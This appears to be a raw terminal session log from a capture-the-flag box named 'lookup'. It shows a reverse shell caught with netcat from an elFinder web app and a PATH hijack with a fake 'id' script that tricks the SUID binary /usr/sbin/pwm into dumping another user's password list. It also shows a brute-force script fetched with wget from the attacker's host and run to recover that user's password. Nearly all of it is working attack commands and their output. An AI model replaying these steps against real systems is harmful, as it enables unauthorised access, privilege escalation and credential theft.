@@ -1,0 +1,354 @@
+Script started on 2025-02-03 22:47:54+03:00 [COMMAND="nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+listening on [any] 6047 ...
+connect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 1430
+bash: cannot set terminal process group (722): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd /home
+cd /home
+www-data@lookup:/home$ ls
+ls
+think
+www-data@lookup:/home$ cd think
+cd think
+www-data@lookup:/home/think$ ls -al
+ls -al
+total 40
+drwxr-xr-x 5 think think 4096 Jan 11  2024 .
+drwxr-xr-x 3 root  root  4096 Jun  2  2023 ..
+lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
+-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
+-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
+drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
+drwx------ 3 think think 4096 Aug  9  2023 .gnupg
+-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
+-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
+drw-r----- 2 think think 4096 Jun 21  2023 .ssh
+lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
+-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
+www-data@lookup:/home/think$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@lookup:/home/think$ cd /tmp
+cd /tmp
+www-data@lookup:/tmp$ find / -perm /4000 2>/dev/null
+find / -perm /4000 2>/dev/null
+/snap/snapd/19457/usr/lib/snapd/snap-confine
+/snap/core20/1950/usr/bin/chfn
+/snap/core20/1950/usr/bin/chsh
+/snap/core20/1950/usr/bin/gpasswd
+/snap/core20/1950/usr/bin/mount
+/snap/core20/1950/usr/bin/newgrp
+/snap/core20/1950/usr/bin/passwd
+/snap/core20/1950/usr/bin/su
+/snap/core20/1950/usr/bin/sudo
+/snap/core20/1950/usr/bin/umount
+/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1950/usr/lib/openssh/ssh-keysign
+/snap/core20/1974/usr/bin/chfn
+/snap/core20/1974/usr/bin/chsh
+/snap/core20/1974/usr/bin/gpasswd
+/snap/core20/1974/usr/bin/mount
+/snap/core20/1974/usr/bin/newgrp
+/snap/core20/1974/usr/bin/passwd
+/snap/core20/1974/usr/bin/su
+/snap/core20/1974/usr/bin/sudo
+/snap/core20/1974/usr/bin/umount
+/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/1974/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pwm
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
+www-data@lookup:/tmp$ ls -al /usr/sbin/pwm
+ls -al /usr/sbin/pwm
+-rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
+www-data@lookup:/tmp$ pwm
+pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+www-data@lookup:/tmp$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@lookup:/tmp$ which id
+which id
+/usr/bin/id
+www-data@lookup:/tmp$ echo 'echo "uid=1000(think)"' > id
+echo 'echo "uid=1000(think)"' > id
+www-data@lookup:/tmp$ cat id
+cat id
+echo "uid=1000(think)"
+www-data@lookup:/tmp$ chmod +x id
+chmod +x id
+www-data@lookup:/tmp$ ./id
+./id
+uid=1000(think)
+www-data@lookup:/tmp$ strings /usr/sbin/pwm
+strings /usr/sbin/pwm
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+fopen
+perror
+puts
+__stack_chk_fail
+putchar
+popen
+fgetc
+__isoc99_fscanf
+fclose
+pclose
+__cxa_finalize
+__libc_start_main
+snprintf
+GLIBC_2.4
+GLIBC_2.7
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+[!] Running 'id' command to extract the username and user ID (UID)
+[-] Error executing id command
+uid=%*u(%[^)])
+[-] Error reading username from id command
+[!] ID: %s
+/home/%s/.passwords
+[-] File /home/%s/.passwords not found
+:*3$"
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8061
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+pwm.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+putchar@@GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__isoc99_fscanf@@GLIBC_2.7
+puts@@GLIBC_2.2.5
+_edata
+fclose@@GLIBC_2.2.5
+__stack_chk_fail@@GLIBC_2.4
+pclose@@GLIBC_2.2.5
+snprintf@@GLIBC_2.2.5
+fgetc@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+popen@@GLIBC_2.2.5
+fopen@@GLIBC_2.2.5
+perror@@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+www-data@lookup:/tmp$ ls
+ls
+f
+id
+www-data@lookup:/tmp$ ls
+ls
+f
+id
+www-data@lookup:/tmp$ ls -al
+ls -al
+total 12
+drwxrwxrwt  2 root     root     4096 Feb  3 19:54 .
+drwxr-xr-x 19 root     root     4096 Jan 11  2024 ..
+prw-r--r--  1 www-data www-data    0 Feb  3 19:58 f
+-rwxr-xr-x  1 www-data www-data   23 Feb  3 19:54 id
+www-data@lookup:/tmp$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+www-data@lookup:/tmp$ id
+id
+uid=1000(think)
+www-data@lookup:/tmp$ pwm
+pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+jose1001teles
+jose100190
+jose10001
+jose10.asd
+jose10+
+jose0_07
+jose0990
+jose0986$
+jose098130443
+jose0981
+jose0924
+jose0923
+jose0921
+thepassword
+jose(1993)
+jose'sbabygurl
+jose&vane
+jose&takie
+jose&samantha
+jose&pam
+jose&jlo
+jose&jessica
+jose&jessi
+josemario.AKA(think)
+jose.medina.
+jose.mar
+jose.luis.24.oct
+jose.line
+jose.leonardo100
+jose.leas.30
+jose.ivan
+jose.i22
+jose.hm
+jose.hater
+jose.fa
+jose.f
+jose.dont
+jose.d
+jose.com}
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171
+www-data@lookup:/tmp$ wget 10.8.61.245:8000/suBF.sh
+wget 10.8.61.245:8000/suBF.sh
+--2025-02-03 20:02:39--  http://10.8.61.245:8000/suBF.sh
+Connecting to 10.8.61.245:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2340 (2.3K) [text/x-sh]
+Saving to: 'suBF.sh'
+
+     0K ..                                                    100% 2.67M=0.001s
+
+2025-02-03 20:02:40 (2.67 MB/s) - 'suBF.sh' saved [2340/2340]
+
+www-data@lookup:/tmp$ wget 10.8.61.245:8000/think.passwords
+wget 10.8.61.245:8000/think.passwords
+--2025-02-03 20:03:27--  http://10.8.61.245:8000/think.passwords
+Connecting to 10.8.61.245:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 525 [application/octet-stream]
+Saving to: 'think.passwords'
+
+     0K                                                       100%  639K=0.001s
+
+2025-02-03 20:03:27 (639 KB/s) - 'think.passwords' saved [525/525]
+
+www-data@lookup:/tmp$ ls
+ls
+f
+id
+suBF.sh
+think.passwords
+www-data@lookup:/tmp$ mv think.passwords think.passwords.txt
+mv think.passwords think.passwords.txt
+www-data@lookup:/tmp$ chmod +x suBF; .sh
+chmod +x suBF.sh
+www-data@lookup:/tmp$ ./suBF.sh -u think -w think.passwords.txt
+./suBF.sh -u think -w think.passwords.txt
+  [+] Bruteforcing think...
+
+^C
+
+Script done on 2025-02-03 23:08:14+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-02-03 23:14:09+03:00 [COMMAND="nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+listening on [any] 6047 ...
+connect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 1509
+python3 -c 'impoty  t rt pty;pty.sa pawn("/bin/bash")'
+www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ cd : /tmp
+cd /tmp
+www-data@lookup:/tmp$ ls
+ls
+f  id  suBF.sh	think.passwords.txt
+www-data@lookup:/tmp$ s ls -al
+ls -al
+total 20
+drwxrwxrwt  2 root     root     4096 Feb  3 20:03 .
+drwxr-xr-x 19 root     root     4096 Jan 11  2024 ..
+prw-r--r--  1 www-data www-data    0 Feb  3 20:06 f
+-rwxr-xr-x  1 www-data www-data   23 Feb  3 19:54 id
+-rwxr-xr-x  1 www-data www-data 2340 Feb  3 20:01 suBF.sh
+-rw-r--r--  1 www-data www-data  525 Feb  3 19:59 think.passwords.txt
+www-data@lookup:/tmp$ cat think         tail think	.passwords.txt
+tail think.passwords.txt
+jose.dont
+jose.d
+jose.com}
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171
+www-data@lookup:/tmp$ ./suBF.sh -  u think 6 -w think.passwords.txt
+./suBF.sh -u think -w think.passwords.txt
+  [+] Bruteforcing think...
+[1;31;103m  You can login as think using password: josemario.AKA(think)[0m
+[1;31;107m  Wordlist exhausted[0m
+www-data@lookup:/tmp$ exit
+exit
+exit
+exit
+
+Script done on 2025-02-03 23:24:37+03:00 [COMMAND_EXIT_CODE="0"]
